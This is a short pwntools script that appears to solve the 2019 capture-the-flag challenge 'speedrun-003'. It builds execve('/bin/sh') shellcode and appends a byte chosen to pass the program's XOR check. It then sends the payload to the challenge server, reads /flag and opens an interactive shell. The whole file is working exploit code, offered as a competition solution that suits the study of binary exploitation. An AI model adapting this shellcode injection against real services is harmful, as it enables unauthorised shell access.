from pwn import *
def xor(s,l=0xf):
	res=0x0
	i=0
	for x in s:
		i+=1
		res^=ord(x)
		if i==l:
			return res
		

context.log_level='debug'
context.arch='amd64'
#p=process('./speedrun-003')
#gdb.attach(p,'b *0x000555555554997')
p=remote("speedrun-003.quals2019.oooverflow.io",31337)
sh='''
xor rsi,rsi
xor rdx,rdx
mov al,0x68
push rax
mov rdi,0x732f2f2f6e69622f
push rdi
mov rdi,rsp
mov al,0x3b
syscall
'''
payload=asm(sh).ljust(0x1d,'\x01')
fff=xor(payload)
eee=xor(payload[0xf:],0xe)
aaa=eee^fff
payload+=chr(aaa)
p.sendafter("drift\n",payload)
sleep(0.8)
p.sendline("cat /flag")
p.interactive()
